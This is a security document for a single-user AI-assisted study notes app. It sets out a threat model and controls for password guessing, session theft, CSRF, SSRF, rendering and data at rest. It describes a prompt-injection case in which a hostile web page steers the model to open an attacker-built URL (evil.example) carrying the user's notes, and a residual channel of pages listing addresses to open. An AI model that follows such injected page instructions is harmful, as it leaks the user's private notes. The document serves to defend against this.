# Security

## What is protected

The app holds one person's working notes: a procedure logbook, memory pages about her studies, conversations with the
assistant, and photos she sends. It should hold no patient data: a chat message that contains a Romanian personal numeric code (CNP) is stopped in the
browser and refused again by the server, and the system prompt tells the assistant never to store patient details.

## Threat model

| Threat | Main controls |
|---|---|
| Someone on the network guesses the password | Single password, stored as an scrypt hash. Login throttle per client address (the right-most untrusted `X-Forwarded-For` entry) plus a global cap, so header tricks give no extra guesses. The app listens on loopback and is published only to the owner's own devices (Tailscale Serve). |
| A stolen or old session cookie | Cookies are `id.expiry.HMAC`, the ids live in a server-side list: logout and a password change revoke them. A damaged signing key stops the server instead of accepting every cookie. |
| Cross-site requests | `SameSite` cookie, an `Origin` check when the public origin is set, and every request with a body must be `application/json` (no simple-form CSRF). |
| A hostile web page steers the model (prompt injection) | **Link provenance**: `deschide_url` opens an address only if it came from her own message, a web search result, the library, or a page already opened in this conversation, or if its host is one of the known guideline sources. An address the model builds around her data (`https://evil.example/?d=<notes>`) is refused, so a page cannot make it send her notes out through a URL. |
| The fetcher reaches internal services (SSRF) | http/https only; every redirect hop is resolved and checked against private, loopback, link-local, CGNAT and the machine's own addresses; the connection is pinned to the checked address; size and time limits; PDF and HTML conversion in a worker thread with its own timeout, so one hostile page cannot freeze the server. |
| The model writes something wrong | Memory pages keep their last 20 versions; logbook changes and deletions are appended to a history file. Lessons are validated against the guideline before anyone sees them. |
| Model output rendered as HTML | Markdown is sanitised with DOMPurify; the Content-Security-Policy allows only same-origin scripts, styles, forms and connections, no framing. |
| A replaced video catalog carries a hostile link | Only `http` and `https` addresses reach a link, films open outside the app with `noopener noreferrer`, and nothing is embedded. |
| The SDK does more than intended | No setting sources, skills, plugins or hooks; only the app's own tools plus web search; the `init` message is checked every turn and the child process does not receive the app password. |
| Data at rest | `umask 077`: files are readable by the service user only. Photos are deleted after an hour, SDK session transcripts after 30 days, logs after 90 days. Dotfiles and symlinks outside `web/` are never served. |

## Review

An independent security review of the backend found 19 issues (2 high, 5 medium, 12 low). All were fixed, each with a
test that failed before the fix (`test/core-review.test.mjs` and the assistant tests). Two residual limits are known and
accepted for a single-user deployment: a hostile page could still list ready-made addresses and ask the model to open
some of them (a slow, visible channel), and a public address of the host that is not on one of its interfaces (a cloud
machine behind NAT) cannot be detected by the fetcher.

## What it is not

Not a medical device. Every answer cites its source so it can be checked against the guideline, and the app is built
and reviewed for one user behind a private network, not for a public multi-user deployment.
